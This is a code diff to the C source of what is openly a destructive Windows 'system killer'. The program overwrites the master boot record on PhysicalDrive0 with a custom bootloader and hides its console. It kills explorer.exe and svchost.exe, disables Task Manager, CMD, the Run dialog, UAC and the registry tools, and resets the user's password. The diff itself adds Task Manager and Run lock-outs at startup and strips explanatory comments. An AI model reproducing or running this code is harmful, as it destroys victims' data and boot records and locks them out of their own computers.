@@ -46,27 +46,22 @@ const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
 
-// The hex data of the bootloader's binary, include custom message
-
 int main()
 {
+    system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
+    system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
+    
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 
     DWORD dwBytesWritten;
-    
+
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
-    // Create handle for overwrite MBR
-
     if (WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE) {
-        // Overwrite MBR completed sucessful
 
         system("taskkill /f /im explorer.exe");
         spamusr();
-
-        // What? We have killed the system! No, they can find it again with some powerful tools. We have to use the legacy system killer again,
-        // except the delete data, because we have overwritten MBR, so we can't modify data on the disk.
 
         system("REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
@@ -81,11 +76,8 @@ int main()
         system("explorer.exe");
 
         system("taskkill /f /im svchost.exe");
-
-        // Bye bye system, you die
     }
     else {
-        // Overwrite MBR fail, using legacy system killer
 
         delusr();
 
@@ -96,8 +88,6 @@ int main()
         spamusr();
 
         system("REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
-        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
-        system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
         system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
         system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DisableCAD /t REG_DWORD /d 0 /f");
 
@@ -105,8 +95,6 @@ int main()
         system("net user %USERNAME% Trashedpc001");
 
         system("explorer.exe");
-
-        // Reaching target: Kill system
 
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
         system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
